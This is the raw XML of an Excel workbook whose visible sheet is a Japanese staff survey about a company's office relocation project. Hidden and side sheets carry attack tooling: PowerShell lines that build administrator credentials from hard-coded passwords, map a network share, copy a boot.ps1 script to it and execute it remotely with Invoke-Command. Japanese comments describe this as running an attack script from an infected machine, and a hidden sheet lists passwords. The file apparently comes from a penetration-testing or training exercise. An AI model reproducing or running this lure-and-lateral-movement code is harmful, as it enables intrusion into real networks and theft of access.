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CSL\R_Malware\AD_shadowFile\"/>
    </mc:Choice>
  </mc:AlternateContent>
  <xr:revisionPtr revIDLastSave="0" documentId="10_ncr:8100000_{11D348C8-FEE1-4608-BBB6-12B7F325C63C}" xr6:coauthVersionLast="34" xr6:coauthVersionMax="34" xr10:uidLastSave="{00000000-0000-0000-0000-000000000000}"/>
  <bookViews>
    <workbookView xWindow="0" yWindow="0" windowWidth="20490" windowHeight="7575" activeTab="3" xr2:uid="{00000000-000D-0000-FFFF-FFFF00000000}"/>
  </bookViews>
  <sheets>
    <sheet name="アンケート" sheetId="3" r:id="rId1"/>
    <sheet name="PingHosts" sheetId="1" state="hidden" r:id="rId2"/>
    <sheet name="Sheet2" sheetId="2" state="hidden" r:id="rId3"/>
    <sheet name="Scripts" sheetId="6" r:id="rId4"/>
    <sheet name="eicar" sheetId="7" state="hidden" r:id="rId5"/>
  </sheets>
  <functionGroups builtInGroupCount="19"/>
  <calcPr calcId="162913"/>
</workbook>
</file>

<file path=xl/calcChain.xml><?xml version="1.0" encoding="utf-8"?>
<calcChain xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <c r="C22" i="6" l="1"/>
  <c r="C14" i="6"/>
  <c r="C13" i="6"/>
  <c r="C12" i="6"/>
  <c r="C11" i="6"/>
  <c r="C10" i="6"/>
  <c r="B25" i="6" l="1"/>
  <c r="B28" i="6" l="1"/>
  <c r="B22" i="6" l="1"/>
  <c r="B23" i="6"/>
  <c r="B29" i="6"/>
  <c r="A7" i="7" l="1"/>
  <c r="A6" i="7"/>
  <c r="A5" i="7"/>
  <c r="A4" i="7"/>
  <c r="A3" i="7"/>
  <c r="A2" i="7"/>
  <c r="A1" i="7"/>
  <c r="B31" i="6" l="1"/>
  <c r="A16" i="6"/>
  <c r="A14" i="6"/>
  <c r="B14" i="6" s="1"/>
  <c r="A11" i="6"/>
  <c r="B11" i="6" s="1"/>
  <c r="A10" i="6"/>
  <c r="B10" i="6" s="1"/>
  <c r="B13" i="6"/>
  <c r="B1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ishimoto</author>
  </authors>
  <commentList>
    <comment ref="A9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ファイルサーバに攻撃用スクリプトをアップして、リモートからそのスクリプトを実行させるコード（A10～A20）
A9 はスクリプトファイル名</t>
        </r>
      </text>
    </comment>
    <comment ref="B9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AAA社側端末で実行するコード（B10～B26）
B10 はスクリプトファイル名</t>
        </r>
      </text>
    </comment>
  </commentList>
</comments>
</file>

<file path=xl/sharedStrings.xml><?xml version="1.0" encoding="utf-8"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="71" uniqueCount="62">
  <si>
    <t>サーバーIP</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>friend1!</t>
  </si>
  <si>
    <t>121212</t>
  </si>
  <si>
    <t>x900SBx908</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>$pass = ConvertTo-SecureString -AsPlainText $Password -Force</t>
  </si>
  <si>
    <t>リモート起動（感染端末上で実行）</t>
    <rPh sb="4" eb="6">
      <t>キドウ</t>
    </rPh>
    <rPh sb="7" eb="9">
      <t>カンセン</t>
    </rPh>
    <rPh sb="9" eb="11">
      <t>タンマツ</t>
    </rPh>
    <rPh sb="11" eb="12">
      <t>ジョウ</t>
    </rPh>
    <rPh sb="13" eb="15">
      <t>ジッコウ</t>
    </rPh>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>ユーザリスト取得（リモート端末上で実行）</t>
    <rPh sb="6" eb="8">
      <t>シュトク</t>
    </rPh>
    <rPh sb="13" eb="15">
      <t>タンマツ</t>
    </rPh>
    <rPh sb="15" eb="16">
      <t>ジョウ</t>
    </rPh>
    <rPh sb="17" eb="19">
      <t>ジッコウ</t>
    </rPh>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>invk-cmd.ps1</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>boot.ps1</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username,$pass</t>
  </si>
  <si>
    <t>ドメイン</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>コンピュータ</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>ユーザ名</t>
    <rPh sb="3" eb="4">
      <t>メイ</t>
    </rPh>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>パスワード</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>ドメインコントローラ</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>共有フォルダ</t>
    <rPh sb="0" eb="2">
      <t>キョウユウ</t>
    </rPh>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>#del Q:\boot.ps1</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>取得ファイル</t>
    <rPh sb="0" eb="2">
      <t>シュトク</t>
    </rPh>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>adlist.txt</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>atkkfwh</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>atkkfwh\administrator</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>friend1!</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>Invoke-Command -ComputerName $target -credential $Cred -File Q:\boot.ps1</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>#net use /delete Q:</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>■ご自身について</t>
    <rPh sb="2" eb="4">
      <t>ジシン</t>
    </rPh>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>部署名</t>
    <rPh sb="0" eb="2">
      <t>ブショ</t>
    </rPh>
    <rPh sb="2" eb="3">
      <t>メイ</t>
    </rPh>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>名前</t>
    <rPh sb="0" eb="2">
      <t>ナマエ</t>
    </rPh>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>メールアドレス</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>社員番号</t>
    <rPh sb="0" eb="2">
      <t>シャイン</t>
    </rPh>
    <rPh sb="2" eb="4">
      <t>バンゴウ</t>
    </rPh>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>■本プロジェクトについて</t>
    <rPh sb="1" eb="2">
      <t>ホン</t>
    </rPh>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>■担当業務、コミュニケーション、作業環境について</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>理由</t>
    <rPh sb="0" eb="2">
      <t>リユウ</t>
    </rPh>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>回答</t>
    <rPh sb="0" eb="2">
      <t>カイトウ</t>
    </rPh>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>はい</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>いいえ</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>対象者：</t>
    <rPh sb="0" eb="3">
      <t>タイショウシャ</t>
    </rPh>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>締め切り：</t>
    <rPh sb="0" eb="1">
      <t>シ</t>
    </rPh>
    <rPh sb="2" eb="3">
      <t>キ</t>
    </rPh>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>目的：</t>
    <rPh sb="0" eb="2">
      <t>モクテキ</t>
    </rPh>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>A社　新社屋移転プロジェクトに参加いただいている方</t>
    <rPh sb="15" eb="17">
      <t>サンカ</t>
    </rPh>
    <rPh sb="24" eb="25">
      <t>カタ</t>
    </rPh>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>担当業務を教えてください。</t>
    <rPh sb="0" eb="2">
      <t>タントウ</t>
    </rPh>
    <rPh sb="2" eb="4">
      <t>ギョウム</t>
    </rPh>
    <rPh sb="5" eb="6">
      <t>オシ</t>
    </rPh>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>進捗状況・今後の課題を教えてください。</t>
    <rPh sb="0" eb="2">
      <t>シンチョク</t>
    </rPh>
    <rPh sb="2" eb="4">
      <t>ジョウキョウ</t>
    </rPh>
    <rPh sb="5" eb="7">
      <t>コンゴ</t>
    </rPh>
    <rPh sb="8" eb="10">
      <t>カダイ</t>
    </rPh>
    <rPh sb="11" eb="12">
      <t>オシ</t>
    </rPh>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>参加しているプロジェクトにおけるコミュニケーションに満足していますか？</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>参加しているプロジェクトにおいて、担当業務に満足していますか？</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>参加しているプロジェクトでの作業環境に満足していますか？</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>本プロジェクトにおける状況把握</t>
    <rPh sb="0" eb="1">
      <t>ホン</t>
    </rPh>
    <rPh sb="11" eb="13">
      <t>ジョウキョウ</t>
    </rPh>
    <rPh sb="13" eb="15">
      <t>ハアク</t>
    </rPh>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>◆A社　新社屋移転プロジェクトに関するアンケート調査</t>
    <rPh sb="2" eb="3">
      <t>シャ</t>
    </rPh>
    <rPh sb="4" eb="7">
      <t>シンシャオク</t>
    </rPh>
    <rPh sb="7" eb="9">
      <t>イテン</t>
    </rPh>
    <rPh sb="16" eb="17">
      <t>カン</t>
    </rPh>
    <rPh sb="24" eb="26">
      <t>チョウサ</t>
    </rPh>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>192.168.10.2</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>$ie = New-Object -ComObject InternetExplorer.Application</t>
  </si>
  <si>
    <t>$ie.Visible=$true</t>
  </si>
  <si>
    <t>192.168.10.211</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>\\192.168.10.211\share</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>copy boot.ps1 Q:\</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>#net use /delete Q:</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>fhackers</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>◇テストサーバーのIPアドレスを入力します。</t>
    <rPh sb="16" eb="18">
      <t>ニュウリョク</t>
    </rPh>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>結果</t>
    <rPh sb="0" eb="2">
      <t>ケッカ</t>
    </rPh>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>netuse.ps1</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>Lock.ps1</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>//\\10.10.10.253\share\Locked_Eng.xlsm</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>×</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>pentest!</t>
    <phoneticPr fontId="1"/>
  </si>
  <si>
    <t>www.c-atkkfwh.com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</si>
</sst>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3" borderId="6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10" xfId="0" applyBorder="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="3" borderId="11" xfId="0" applyFill="1" applyBorder="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="3" borderId="13" xfId="0" applyFill="1" applyBorder="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="17" xfId="0" applyBorder="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="3" borderId="19" xfId="0" applyFill="1" applyBorder="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="20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 applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="11" xfId="0" applyBorder="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="23" xfId="0" applyBorder="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="5" fillId="0" borderId="5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3" borderId="25" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="3" borderId="14" xfId="0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vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="26" xfId="0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3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3" borderId="5" xfId="0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3" borderId="6" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment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0" fillId="3" borderId="9" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="top"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="3" borderId="21" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="top"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="3" borderId="18" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="top"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="3" borderId="22" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="top"/>
    </xf>
    <xf numFmtId="0" fontId="6" fillId="0" borderId="0" xfId="0" applyFont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E38"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="B10" sqref="B10"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="13.5" x14ac:dyDescent="0.15"/>
  <cols>
    <col min="1" max="2" width="3.625" customWidth="1"/>
    <col min="3" max="4" width="5.625" customWidth="1"/>
    <col min="5" max="5" width="51" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="A1" s="54" t="s">
        <v>45</v>
      </c>
      <c r="B1" s="37"/>
      <c r="C1" s="37"/>
      <c r="D1" s="37"/>
      <c r="E1" s="37"/>
    </row>
    <row r="2" spans="1:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B2" s="36" t="s">
        <v>37</v>
      </c>
      <c r="C2" s="36"/>
      <c r="D2" s="37" t="s">
        <v>44</v>
      </c>
      <c r="E2" s="37"/>
    </row>
    <row r="3" spans="1:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B3" s="36" t="s">
        <v>35</v>
      </c>
      <c r="C3" s="36"/>
      <c r="D3" s="37" t="s">
        <v>38</v>
      </c>
      <c r="E3" s="37"/>
    </row>
    <row r="4" spans="1:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B4" s="36" t="s">
        <v>36</v>
      </c>
      <c r="C4" s="36"/>
      <c r="D4" s="38">
        <v>43343</v>
      </c>
      <c r="E4" s="39"/>
    </row>
    <row r="6" spans="1:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B6" s="42" t="s">
        <v>24</v>
      </c>
      <c r="C6" s="43"/>
      <c r="D6" s="43"/>
      <c r="E6" s="44"/>
    </row>
    <row r="7" spans="1:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B7" s="4"/>
      <c r="C7" s="40" t="s">
        <v>25</v>
      </c>
      <c r="D7" s="41"/>
      <c r="E7" s="10"/>
    </row>
    <row r="8" spans="1:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B8" s="4"/>
      <c r="C8" s="32" t="s">
        <v>28</v>
      </c>
      <c r="D8" s="33"/>
      <c r="E8" s="11"/>
    </row>
    <row r="9" spans="1:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B9" s="4"/>
      <c r="C9" s="32" t="s">
        <v>26</v>
      </c>
      <c r="D9" s="33"/>
      <c r="E9" s="7"/>
    </row>
    <row r="10" spans="1:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B10" s="5"/>
      <c r="C10" s="34" t="s">
        <v>27</v>
      </c>
      <c r="D10" s="35"/>
      <c r="E10" s="13"/>
    </row>
    <row r="11" spans="1:5" ht="15" customHeight="1" x14ac:dyDescent="0.15"/>
    <row r="12" spans="1:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B12" s="6" t="s">
        <v>29</v>
      </c>
      <c r="C12" s="15"/>
      <c r="D12" s="15"/>
      <c r="E12" s="3"/>
    </row>
    <row r="13" spans="1:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B13" s="4"/>
      <c r="C13" s="9" t="s">
        <v>39</v>
      </c>
      <c r="D13" s="14"/>
      <c r="E13" s="17"/>
    </row>
    <row r="14" spans="1:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B14" s="4"/>
      <c r="C14" s="45"/>
      <c r="D14" s="46"/>
      <c r="E14" s="47"/>
    </row>
    <row r="15" spans="1:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B15" s="4"/>
      <c r="C15" s="45"/>
      <c r="D15" s="46"/>
      <c r="E15" s="47"/>
    </row>
    <row r="16" spans="1:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B16" s="4"/>
      <c r="C16" s="45"/>
      <c r="D16" s="46"/>
      <c r="E16" s="47"/>
    </row>
    <row r="17" spans="2:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B17" s="4"/>
      <c r="C17" s="48"/>
      <c r="D17" s="49"/>
      <c r="E17" s="50"/>
    </row>
    <row r="18" spans="2:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B18" s="4"/>
      <c r="C18" s="6" t="s">
        <v>40</v>
      </c>
      <c r="D18" s="15"/>
      <c r="E18" s="3"/>
    </row>
    <row r="19" spans="2:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B19" s="4"/>
      <c r="C19" s="51"/>
      <c r="D19" s="52"/>
      <c r="E19" s="53"/>
    </row>
    <row r="20" spans="2:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B20" s="4"/>
      <c r="C20" s="45"/>
      <c r="D20" s="46"/>
      <c r="E20" s="47"/>
    </row>
    <row r="21" spans="2:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B21" s="4"/>
      <c r="C21" s="45"/>
      <c r="D21" s="46"/>
      <c r="E21" s="47"/>
    </row>
    <row r="22" spans="2:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B22" s="5"/>
      <c r="C22" s="48"/>
      <c r="D22" s="49"/>
      <c r="E22" s="50"/>
    </row>
    <row r="23" spans="2:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="C23" s="16"/>
      <c r="D23" s="16"/>
      <c r="E23" s="16"/>
    </row>
    <row r="24" spans="2:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B24" s="6" t="s">
        <v>30</v>
      </c>
      <c r="C24" s="15"/>
      <c r="D24" s="15"/>
      <c r="E24" s="3"/>
    </row>
    <row r="25" spans="2:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B25" s="4"/>
      <c r="C25" s="29" t="s">
        <v>42</v>
      </c>
      <c r="D25" s="30"/>
      <c r="E25" s="31"/>
    </row>
    <row r="26" spans="2:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B26" s="4"/>
      <c r="C26" s="19"/>
      <c r="D26" s="21" t="s">
        <v>32</v>
      </c>
      <c r="E26" s="20" t="s">
        <v>31</v>
      </c>
    </row>
    <row r="27" spans="2:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B27" s="4"/>
      <c r="C27" s="12"/>
      <c r="D27" s="24" t="s">
        <v>33</v>
      </c>
      <c r="E27" s="11"/>
    </row>
    <row r="28" spans="2:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B28" s="4"/>
      <c r="C28" s="18"/>
      <c r="D28" s="23" t="s">
        <v>34</v>
      </c>
      <c r="E28" s="8"/>
    </row>
    <row r="29" spans="2:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B29" s="4"/>
      <c r="C29" s="29" t="s">
        <v>41</v>
      </c>
      <c r="D29" s="30"/>
      <c r="E29" s="31"/>
    </row>
    <row r="30" spans="2:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B30" s="4"/>
      <c r="C30" s="22"/>
      <c r="D30" s="21" t="s">
        <v>32</v>
      </c>
      <c r="E30" s="20" t="s">
        <v>31</v>
      </c>
    </row>
    <row r="31" spans="2:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B31" s="4"/>
      <c r="C31" s="12"/>
      <c r="D31" s="24" t="s">
        <v>33</v>
      </c>
      <c r="E31" s="11"/>
    </row>
    <row r="32" spans="2:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B32" s="4"/>
      <c r="C32" s="18"/>
      <c r="D32" s="23" t="s">
        <v>34</v>
      </c>
      <c r="E32" s="8"/>
    </row>
    <row r="33" spans="2:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B33" s="4"/>
      <c r="C33" s="29" t="s">
        <v>43</v>
      </c>
      <c r="D33" s="30"/>
      <c r="E33" s="31"/>
    </row>
    <row r="34" spans="2:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B34" s="4"/>
      <c r="C34" s="19"/>
      <c r="D34" s="21" t="s">
        <v>32</v>
      </c>
      <c r="E34" s="20" t="s">
        <v>31</v>
      </c>
    </row>
    <row r="35" spans="2:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B35" s="4"/>
      <c r="C35" s="12"/>
      <c r="D35" s="24" t="s">
        <v>33</v>
      </c>
      <c r="E35" s="11"/>
    </row>
    <row r="36" spans="2:5" ht="15" customHeight="1" x14ac:dyDescent="0.15">
      <c r="B36" s="5"/>
      <c r="C36" s="18"/>
      <c r="D36" s="23" t="s">
        <v>34</v>
      </c>
      <c r="E36" s="8"/>
    </row>
    <row r="37" spans="2:5" ht="15" customHeight="1" x14ac:dyDescent="0.15"/>
    <row r="38" spans="2:5" ht="15" customHeight="1" x14ac:dyDescent="0.15"/>
  </sheetData>
  <mergeCells count="17">
    <mergeCell ref="B2:C2"/>
    <mergeCell ref="D2:E2"/>
    <mergeCell ref="A1:E1"/>
    <mergeCell ref="C29:E29"/>
    <mergeCell ref="C33:E33"/>
    <mergeCell ref="C9:D9"/>
    <mergeCell ref="C10:D10"/>
    <mergeCell ref="B3:C3"/>
    <mergeCell ref="D3:E3"/>
    <mergeCell ref="D4:E4"/>
    <mergeCell ref="B4:C4"/>
    <mergeCell ref="C7:D7"/>
    <mergeCell ref="C8:D8"/>
    <mergeCell ref="B6:E6"/>
    <mergeCell ref="C25:E25"/>
    <mergeCell ref="C14:E17"/>
    <mergeCell ref="C19:E2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D6"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="B3" sqref="B3"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="13.5" x14ac:dyDescent="0.15"/>
  <cols>
    <col min="2" max="2" width="3.75" customWidth="1"/>
    <col min="3" max="3" width="14" bestFit="1" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="3" spans="2:4" x14ac:dyDescent="0.15">
      <c r="B3" t="s">
        <v>54</v>
      </c>
      <c r="D3" s="25"/>
    </row>
    <row r="4" spans="2:4" x14ac:dyDescent="0.15">
      <c r="C4" s="26" t="s">
        <v>0</v>
      </c>
      <c r="D4" s="26" t="s">
        <v>55</v>
      </c>
    </row>
    <row r="5" spans="2:4" x14ac:dyDescent="0.15">
      <c r="C5" s="1" t="s">
        <v>61</v>
      </c>
      <c r="D5" s="27" t="s">
        <v>59</v>
      </c>
    </row>
    <row r="6" spans="2:4" x14ac:dyDescent="0.15">
      <c r="C6" s="1"/>
      <c r="D6" s="27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5"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="A6" sqref="A6"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="13.5" x14ac:dyDescent="0.15"/>
  <cols>
    <col min="1" max="1" width="12.125" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:1" x14ac:dyDescent="0.15">
      <c r="A1" s="2" t="s">
        <v>2</v>
      </c>
    </row>
    <row r="2" spans="1:1" x14ac:dyDescent="0.15">
      <c r="A2" s="2" t="s">
        <v>1</v>
      </c>
    </row>
    <row r="3" spans="1:1" x14ac:dyDescent="0.15">
      <c r="A3" s="2" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="4" spans="1:1" x14ac:dyDescent="0.15">
      <c r="A4" s="2" t="s">
        <v>53</v>
      </c>
    </row>
    <row r="5" spans="1:1" x14ac:dyDescent="0.15">
      <c r="A5" s="2" t="s">
        <v>60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1"/>
  <sheetViews>
    <sheetView tabSelected="1" topLeftCell="A10" zoomScale="85" zoomScaleNormal="85" workbookViewId="0">
      <selection activeCell="A16" sqref="A16"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="13.5" x14ac:dyDescent="0.15"/>
  <cols>
    <col min="1" max="1" width="96.375" customWidth="1"/>
    <col min="2" max="2" width="103.5" customWidth="1"/>
    <col min="3" max="3" width="96.75" customWidth="1"/>
    <col min="4" max="4" width="30.625" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:4" x14ac:dyDescent="0.15">
      <c r="A1" t="s">
        <v>10</v>
      </c>
      <c r="B1" t="s">
        <v>19</v>
      </c>
    </row>
    <row r="2" spans="1:4" x14ac:dyDescent="0.15">
      <c r="A2" t="s">
        <v>14</v>
      </c>
      <c r="B2" t="s">
        <v>49</v>
      </c>
    </row>
    <row r="3" spans="1:4" x14ac:dyDescent="0.15">
      <c r="A3" t="s">
        <v>15</v>
      </c>
      <c r="B3" t="s">
        <v>50</v>
      </c>
      <c r="C3" s="28"/>
    </row>
    <row r="4" spans="1:4" x14ac:dyDescent="0.15">
      <c r="A4" t="s">
        <v>11</v>
      </c>
      <c r="B4" t="s">
        <v>46</v>
      </c>
    </row>
    <row r="5" spans="1:4" x14ac:dyDescent="0.15">
      <c r="A5" t="s">
        <v>12</v>
      </c>
      <c r="B5" t="s">
        <v>20</v>
      </c>
    </row>
    <row r="6" spans="1:4" x14ac:dyDescent="0.15">
      <c r="A6" t="s">
        <v>13</v>
      </c>
      <c r="B6" t="s">
        <v>21</v>
      </c>
    </row>
    <row r="7" spans="1:4" x14ac:dyDescent="0.15">
      <c r="A7" t="s">
        <v>17</v>
      </c>
      <c r="B7" t="s">
        <v>18</v>
      </c>
    </row>
    <row r="8" spans="1:4" x14ac:dyDescent="0.15">
      <c r="A8" t="s">
        <v>5</v>
      </c>
      <c r="B8" t="s">
        <v>6</v>
      </c>
    </row>
    <row r="9" spans="1:4" x14ac:dyDescent="0.15">
      <c r="A9" t="s">
        <v>7</v>
      </c>
      <c r="B9" t="s">
        <v>8</v>
      </c>
      <c r="C9" t="s">
        <v>56</v>
      </c>
      <c r="D9" t="s">
        <v>57</v>
      </c>
    </row>
    <row r="10" spans="1:4" x14ac:dyDescent="0.15">
      <c r="A10" t="str">
        <f>"$Username = '"&amp;B5&amp;"'"</f>
        <v>$Username = 'atkkfwh\administrator'</v>
      </c>
      <c r="B10" t="str">
        <f>A10</f>
        <v>$Username = 'atkkfwh\administrator'</v>
      </c>
      <c r="C10" t="str">
        <f>B10</f>
        <v>$Username = 'atkkfwh\administrator'</v>
      </c>
    </row>
    <row r="11" spans="1:4" x14ac:dyDescent="0.15">
      <c r="A11" t="str">
        <f>"$Password = '"&amp;B6&amp;"'"</f>
        <v>$Password = 'friend1!'</v>
      </c>
      <c r="B11" t="str">
        <f t="shared" ref="B11:C14" si="0">A11</f>
        <v>$Password = 'friend1!'</v>
      </c>
      <c r="C11" t="str">
        <f t="shared" si="0"/>
        <v>$Password = 'friend1!'</v>
      </c>
    </row>
    <row r="12" spans="1:4" x14ac:dyDescent="0.15">
      <c r="A12" t="s">
        <v>4</v>
      </c>
      <c r="B12" t="str">
        <f t="shared" si="0"/>
        <v>$pass = ConvertTo-SecureString -AsPlainText $Password -Force</v>
      </c>
      <c r="C12" t="str">
        <f t="shared" si="0"/>
        <v>$pass = ConvertTo-SecureString -AsPlainText $Password -Force</v>
      </c>
    </row>
    <row r="13" spans="1:4" x14ac:dyDescent="0.15">
      <c r="A13" t="s">
        <v>9</v>
      </c>
      <c r="B13" t="str">
        <f t="shared" si="0"/>
        <v>$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username,$pass</v>
      </c>
      <c r="C13" t="str">
        <f t="shared" si="0"/>
        <v>$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username,$pass</v>
      </c>
    </row>
    <row r="14" spans="1:4" x14ac:dyDescent="0.15">
      <c r="A14" t="str">
        <f>"$target = '"&amp;B4&amp;"'"</f>
        <v>$target = '192.168.10.2'</v>
      </c>
      <c r="B14" t="str">
        <f t="shared" si="0"/>
        <v>$target = '192.168.10.2'</v>
      </c>
      <c r="C14" t="str">
        <f t="shared" si="0"/>
        <v>$target = '192.168.10.2'</v>
      </c>
    </row>
    <row r="16" spans="1:4" x14ac:dyDescent="0.15">
      <c r="A16" t="str">
        <f>"net use Q: "&amp;B3&amp;" "&amp;B6&amp;" /user:"&amp;B5</f>
        <v>net use Q: \\192.168.10.211\share friend1! /user:atkkfwh\administrator</v>
      </c>
    </row>
    <row r="17" spans="1:4" x14ac:dyDescent="0.15">
      <c r="A17" t="s">
        <v>51</v>
      </c>
    </row>
    <row r="18" spans="1:4" x14ac:dyDescent="0.15">
